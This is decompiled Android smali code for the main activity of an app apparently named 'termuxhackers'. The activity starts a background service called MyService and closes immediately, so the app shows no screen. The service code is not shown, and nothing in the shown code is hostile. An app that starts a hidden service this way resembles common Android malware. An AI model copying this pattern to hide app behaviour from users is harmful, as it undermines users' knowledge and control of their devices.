.class public Lcom/termuxhackers/id/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 19
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v5, v0

    const-string v6, "com.aide.ui"

    invoke-static {v5, v6}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 15
    move-object v5, v0

    move-object v6, v1

    invoke-super {v5, v6}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 17
    move-object v5, v0

    new-instance v6, Landroid/content/Intent;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    :try_start_0
    const-string v9, "com.termuxhackers.id.MyService"

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    invoke-direct {v7, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v6}, Lcom/termuxhackers/id/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v5

    .line 18
    move-object v5, v0

    invoke-virtual {v5}, Lcom/termuxhackers/id/MainActivity;->finish()V

    return-void

    .line 17
    :catch_0
    move-exception v5

    move-object v3, v5

    new-instance v5, Ljava/lang/NoClassDefFoundError;

    move-object v13, v5

    move-object v5, v13

    move-object v6, v13

    move-object v7, v3

    invoke-virtual {v7}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v5
.end method
